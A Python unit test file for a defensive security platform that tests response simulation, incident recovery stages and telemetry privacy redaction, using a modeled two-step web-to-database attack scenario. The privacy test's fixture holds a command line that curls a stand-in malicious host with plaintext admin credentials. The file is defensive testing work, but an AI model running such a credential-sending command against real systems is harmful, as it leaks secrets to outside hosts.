from __future__ import annotations
"""
Unit tests for Phase 6:
- Security Twin Response Lab Candidate Simulation (Section 31)
- Resilience & Recovery Closed Loop (Section 34)
- Privacy-Aware Telemetry & Data Minimization (Section 35)
"""

import time
import unittest
from security_twin.models import (
    AttackScenario, AttackStage, AttackStep, Host, User, Process, Network, Service
)
from security_twin.state import SecurityTwin
from security_twin.simulation import SecurityTwinSimulator
from response.recovery_loop import ResilienceRecoveryEngine, RecoveryStage
from sensors.privacy_manager import TelemetryPrivacyManager, PrivacyTier


class TestPhase6ResponseAndResilience(unittest.TestCase):
    def setUp(self):
        # 1. Setup sample Security Twin topology
        self.twin = SecurityTwin("test-twin-phase6")
        self.twin.add_host(Host(host_id="host-web", hostname="web-server", ip_address="10.0.1.10", criticality=0.6))
        self.twin.add_host(Host(host_id="host-db", hostname="db-server", ip_address="10.0.1.50", criticality=0.9))
        self.twin.add_user(User(user_id="user-admin", username="admin_svc", is_privileged=True))
        self.twin.add_process(Process(pid=1001, process_name="python webapp.py", host_id="host-web", user_id="user-admin"))
        self.twin.add_network(Network(network_id="net-prod", cidr="10.0.1.0/24"))
        self.twin.add_service(Service(service_id="svc-http", name="webapp", host_id="host-web", port=80))

        # Sample scenario
        self.scenario = AttackScenario(
            scenario_id="scen-001",
            name="Web Exploitation to DB Exfiltration",
            description="Two-stage web exploit and lateral movement attack",
            steps=[
                AttackStep(
                    step_id="step-1",
                    stage=AttackStage.INITIAL_ACCESS,
                    timestamp=100.0,
                    source="198.51.100.44",
                    destination="10.0.1.10",
                    technique="T1190",
                    technique_name="Exploit Public-Facing App",
                    preconditions={"src_ip": "198.51.100.44", "dst_host": "host-web"},
                    postconditions={"compromised": "host-web"},
                ),
                AttackStep(
                    step_id="step-2",
                    stage=AttackStage.LATERAL_MOVEMENT,
                    timestamp=105.0,
                    source="10.0.1.10",
                    destination="10.0.1.50",
                    technique="T1021",
                    technique_name="Remote Services",
                    preconditions={"src_host": "host-web", "dst_host": "host-db"},
                    postconditions={"compromised": "host-db"},
                ),
            ],
        )

        self.simulator = SecurityTwinSimulator(self.twin)
        self.recovery_engine = ResilienceRecoveryEngine(safe_residual_risk_threshold=0.15, recurrence_window_sec=5.0)
        self.privacy_mgr = TelemetryPrivacyManager(hmac_key="test_salt_key")

    def test_response_lab_candidate_simulation(self):
        candidates = [
            ("NO_ACTION", "host-web"),
            ("BLOCK_SOURCE", "198.51.100.44"),
            ("ISOLATE_HOST", "host-web"),
        ]

        results = self.simulator.simulate_candidate_responses(self.scenario, candidates, current_risk=0.88)
        self.assertEqual(len(results), 3)

        # Ensure NO_ACTION has 0 risk reduction
        no_action_res = next(r for r in results if r["action_type"] == "NO_ACTION")
        self.assertEqual(no_action_res["risk_reduction"], 0.0)
        self.assertFalse(no_action_res["is_recommended"])

        # Ensure at least one active mitigation is recommended
        recommended = [r for r in results if r["is_recommended"]]
        self.assertEqual(len(recommended), 1)
        self.assertIn(recommended[0]["action_type"], ("BLOCK_SOURCE", "ISOLATE_HOST"))
        self.assertGreater(recommended[0]["utility_score"], 0.0)

    def test_recovery_lifecycle_progression(self):
        inc_id = "inc-rec-001"
        rec = self.recovery_engine.register_incident(inc_id, "host-web", initial_risk=0.85)
        self.assertEqual(rec.current_stage, RecoveryStage.DETECTED)

        # 1. Contain
        rec = self.recovery_engine.advance_to_contained(inc_id, "ISOLATE_HOST", post_containment_risk=0.40)
        self.assertEqual(rec.current_stage, RecoveryStage.CONTAINED)
        self.assertIsNotNone(rec.contained_at)

        # 2. Eradicate
        rec = self.recovery_engine.advance_to_eradicated(inc_id, ["/tmp/malware.sh", "crontab_job_99"])
        self.assertEqual(rec.current_stage, RecoveryStage.ERADICATED)

        # 3. Restore
        rec = self.recovery_engine.advance_to_restored(inc_id, "snapshot-golden-v2.1")
        self.assertEqual(rec.current_stage, RecoveryStage.RESTORED)

        # 4. Verify (Fail if risk high)
        ok, rec = self.recovery_engine.advance_to_verified(inc_id, observed_telemetry_risk=0.30)
        self.assertFalse(ok)
        self.assertEqual(rec.current_stage, RecoveryStage.RESTORED)

        # 4. Verify (Pass if risk low)
        ok, rec = self.recovery_engine.advance_to_verified(inc_id, observed_telemetry_risk=0.08)
        self.assertTrue(ok)
        self.assertEqual(rec.current_stage, RecoveryStage.VERIFIED)

        # 5. Recover
        rec = self.recovery_engine.advance_to_recovered(inc_id)
        self.assertEqual(rec.current_stage, RecoveryStage.RECOVERED)
        self.assertIsNotNone(rec.recovered_at)
        self.assertGreater(rec.time_to_recovery_sec, 0.0)

        # 6. Recurrence watchdog
        reopened, rec = self.recovery_engine.evaluate_recurrence(inc_id, current_entity_risk=0.65, risk_spike_threshold=0.35)
        self.assertTrue(reopened)
        self.assertEqual(rec.current_stage, RecoveryStage.REOPENED_ON_RECURRENCE)

    def test_privacy_transformations(self):
        event = {
            "src_ip": "10.0.1.105",
            "dst_ip": "198.51.100.8",
            "user": "alice_finance",
            "process_cmdline": "curl -u admin:password123 http://malicious.com/api",
            "event_type": "process_creation",
        }

        # 1. Classification
        tier = self.privacy_mgr.classify_event(event)
        self.assertEqual(tier, PrivacyTier.HIGHLY_SENSITIVE)

        # 2. Sanitization
        sanitized = self.privacy_mgr.sanitize_event(event)
        self.assertEqual(sanitized["privacy_tier"], "HIGHLY_SENSITIVE")
        self.assertIn("forensic_vault_ref", sanitized)
        self.assertEqual(len(sanitized["forensic_vault_ref"]), 64)

        # Check IP subnet masking (/16 on HIGHLY_SENSITIVE)
        self.assertTrue(sanitized["src_ip"].endswith(".0.0/16"))

        # Check username pseudonymization
        self.assertTrue(sanitized["user"].startswith("user_"))
        self.assertNotIn("alice_finance", sanitized["user"])

        # Check credential redaction
        self.assertNotIn("password123", sanitized["process_cmdline"])
        self.assertIn("[REDACTED_SECRET]", sanitized["process_cmdline"])


if __name__ == "__main__":
    unittest.main()
